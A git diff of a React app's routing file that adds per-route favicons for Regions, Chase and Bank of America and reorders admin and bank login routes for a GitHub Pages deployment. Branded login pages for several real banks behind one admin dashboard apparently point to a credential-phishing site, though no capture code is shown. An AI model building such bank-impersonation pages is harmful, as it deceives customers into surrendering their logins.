@@ -1,4 +1,4 @@
-import { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom'
+import { BrowserRouter, Routes, Route, Navigate, useLocation, useNavigate } from 'react-router-dom'
 import { useState, useEffect } from 'react'
 
 // Regions Bank
@@ -17,22 +17,82 @@ import BankOfAmericaLanding from './pages/BankOfAmericaLanding'
 import AdminLogin from './pages/AdminLogin'
 import AdminDashboard from './pages/AdminDashboard'
 
-function App() {
+function AppContent() {
+  const location = useLocation()
+  const navigate = useNavigate()
   const [isAuthenticated, setIsAuthenticated] = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
   const [loading, setLoading] = useState(true)
 
+  // Update favicon based on current route - run after render to avoid interfering with routing
   useEffect(() => {
-    // Handle GitHub Pages 404.html redirect
-    // The 404.html redirects to /?/path, so we need to convert it back
-    const path = window.location.search.slice(1)
-    if (path && path.startsWith('/')) {
-      const pathParts = path.split('&')
-      const newPath = pathParts[0].replace(/~and~/g, '&')
-      const newSearch = pathParts.slice(1).join('&').replace(/~and~/g, '&')
-      window.history.replaceState(null, '', newPath + (newSearch ? '?' + newSearch : '') + window.location.hash)
+    // Use requestAnimationFrame to ensure this runs after React has finished rendering
+    const updateFavicon = () => {
+      let faviconPath = '/regions-logo.svg' // default
+      const path = location.pathname
+
+      if (path.includes('/chase-bank')) {
+        faviconPath = '/chase-logo.svg'
+      } else if (path.includes('/bank-of-america')) {
+        faviconPath = '/bofa-logo.svg'
+      } else if (path.includes('/admin')) {
+        faviconPath = '/regions-logo.svg'
+      } else if (path.includes('/region-bank') || path === '/') {
+        faviconPath = '/regions-logo.svg'
+      }
+
+      // Update favicon - find or create the favicon link
+      const head = document.getElementsByTagName('head')[0]
+      if (!head) return
+      
+      let link = head.querySelector("link[rel='icon']") || 
+                 head.querySelector("link[rel*='icon']") ||
+                 head.querySelector("link[rel='shortcut icon']")
+      
+      if (!link) {
+        link = document.createElement('link')
+        link.rel = 'icon'
+        link.type = 'image/svg+xml'
+        head.appendChild(link)
+      }
+      
+      // Only update if different
+      const fullPath = window.location.origin + faviconPath
+      if (link.href !== fullPath) {
+        link.href = faviconPath
+      }
     }
 
+    // Use requestAnimationFrame to run after render
+    const rafId = requestAnimationFrame(() => {
+      updateFavicon()
+    })
+    
+    return () => {
+      cancelAnimationFrame(rafId)
+    }
+  }, [location.pathname])
+
+  useEffect(() => {
+    // Handle GitHub Pages 404.html redirect (only once on mount)
+    // Only process if we have a query string that looks like a 404 redirect from 404.html
+    // The 404.html redirects to /?/path, so we look for ?/ in the query string
+    const search = window.location.search
+    if (search && search.startsWith('?/')) {
+      const path = search.slice(1) // Remove the '?'
+      if (path && path.startsWith('/')) {
+        const pathParts = path.split('&')
+        const newPath = pathParts[0].replace(/~and~/g, '&')
+        const newSearch = pathParts.slice(1).join('&').replace(/~and~/g, '&')
+        // Use React Router's navigate to properly handle the redirect
+        const newUrl = newPath + (newSearch ? '?' + newSearch : '') + window.location.hash
+        navigate(newUrl, { replace: true })
+      }
+    }
+    // eslint-disable-next-line react-hooks/exhaustive-deps
+  }, []) // Only run once on mount
+
+  useEffect(() => {
     const checkAuth = () => {
       const auth = localStorage.getItem('isAuthenticated')
       const userEmail = localStorage.getItem('userEmail')
@@ -63,8 +123,21 @@ function App() {
   }
 
   return (
-    <BrowserRouter>
-      <Routes>
+    <Routes>
+        {/* Admin Routes - Put first to ensure they match before other routes */}
+        <Route 
+          path="/admin/login" 
+          element={
+            isAdminAuthenticated ? <Navigate to="/admin" replace /> : <AdminLogin setIsAdminAuthenticated={setIsAdminAuthenticated} />
+          } 
+        />
+        <Route 
+          path="/admin" 
+          element={
+            isAdminAuthenticated ? <AdminDashboard /> : <Navigate to="/admin/login" replace />
+          } 
+        />
+
         {/* Regions Bank Routes */}
         <Route 
           path="/region-bank/login" 
@@ -107,23 +180,16 @@ function App() {
           } 
         />
 
-        {/* Admin Routes */}
-        <Route 
-          path="/admin/login" 
-          element={
-            isAdminAuthenticated ? <Navigate to="/admin" replace /> : <AdminLogin setIsAdminAuthenticated={setIsAdminAuthenticated} />
-          } 
-        />
-        <Route 
-          path="/admin" 
-          element={
-            isAdminAuthenticated ? <AdminDashboard /> : <Navigate to="/admin/login" replace />
-          } 
-        />
-
-        {/* Default redirect */}
+        {/* Default redirect - Must be last */}
         <Route path="/" element={<Navigate to="/region-bank/login" replace />} />
       </Routes>
+  )
+}
+
+function App() {
+  return (
+    <BrowserRouter>
+      <AppContent />
     </BrowserRouter>
   )
 }
